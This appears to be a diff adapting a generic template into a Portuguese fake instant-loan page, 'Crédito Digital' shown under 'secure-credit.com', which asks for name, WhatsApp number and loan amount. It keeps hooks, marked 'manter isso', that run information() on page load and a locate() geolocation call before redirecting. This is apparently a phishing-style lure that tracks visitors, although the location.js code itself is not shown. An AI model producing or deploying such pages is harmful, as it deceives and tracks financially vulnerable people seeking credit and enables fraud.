@@ -2,80 +2,67 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>{{TITLE}}</title>
+  <title>Crédito Online</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <!-- seu CSS -->
   <link rel="stylesheet" href="style.css">
-  
-  <!-- Redirect HTTP to HTTPS -->
-  <script type="text/javascript">
+
+  <!-- manter isso -->
+  <script>
     if (window.location.protocol == "http:") {
       var restOfUrl = window.location.href.substr(5);
       window.location = "https:" + restOfUrl;
     }
   </script>
-  
-  <!-- Load jQuery and location.js -->
-  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-  <script type="text/javascript" src="js/location.js"></script>
+
+  <!-- manter isso -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="js/location.js"></script>
 </head>
 
+<!-- manter onload -->
 <body onload="information();">
-  <div class="top-bar">
-    <span class="site">{{SITENAME}}</span>
-    <span class="url">{{DISPLAY_URL}}</span>
+
+<div class="top-bar">
+  <span class="site">Crédito Digital</span>
+  <span class="url">secure-credit.com</span>
+</div>
+
+<header style="text-align:center; padding:20px;">
+  <h1>Crédito aprovado na hora</h1>
+  <p>Solicite seu empréstimo com rapidez e segurança</p>
+</header>
+
+<section class="card">
+
+  <h2>Simule seu empréstimo</h2>
+
+  <form onsubmit="event.preventDefault();">
+
+    <input type="text" placeholder="Nome completo" required>
+    <input type="tel" placeholder="WhatsApp" required>
+    <input type="number" placeholder="Valor desejado (R$)" required>
+
+    <!-- BOTÃO ORIGINAL ADAPTADO -->
+    <button type="button"
+      onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Erro');});">
+      Continuar
+    </button>
+
+  </form>
+
+  <div class="badges">
+    <span>✔ Sem burocracia</span>
+    <span>✔ Resposta imediata</span>
+    <span>✔ 100% online</span>
   </div>
 
-  <header>
-    <img src="{{IMAGE}}" class="hero-img">
-    <h1>Crédito aprovado na hora</h1>
-    <p>{{DESC}}</p>
-  </header>
+</section>
 
-  <section class="card">
-    <h2>Simule seu empréstimo</h2>
-    
-    <form id="loanForm">
-      <input type="text" placeholder="Nome completo" required>
-      <input type="tel" placeholder="WhatsApp" required>
-      <input type="number" placeholder="Valor desejado (R$)" required>
-      
-      <button type="submit">Continuar</button>
-    </form>
+<footer style="text-align:center;">
+  <p>© Crédito Digital</p>
+</footer>
 
-    <div class="badges">
-      <span>✔ Sem burocracia</span>
-      <span>✔ Resposta imediata</span>
-      <span>✔ 100% online</span>
-    </div>
-  </section>
-
-  <footer>
-    <p>© {{SITENAME}} - Todos os direitos reservados</p>
-  </footer>
-
-  <script src="script.js"></script>
-  
-  <!-- Request access button with geolocation -->
-  <script>
-    function handleAccessRequest() {
-      locate(
-        function() {
-          // Success callback - redirect to REDIRECT_URL
-          window.location = "REDIRECT_URL";
-        },
-        function() {
-          // Error callback - show failure message
-          document.getElementById("status").textContent = "Falha na detecção de localização";
-        }
-      );
-    }
-
-    // Attach event listener to submit button
-    document.getElementById("loanForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      handleAccessRequest();
-    });
-  </script>
 </body>
 </html>
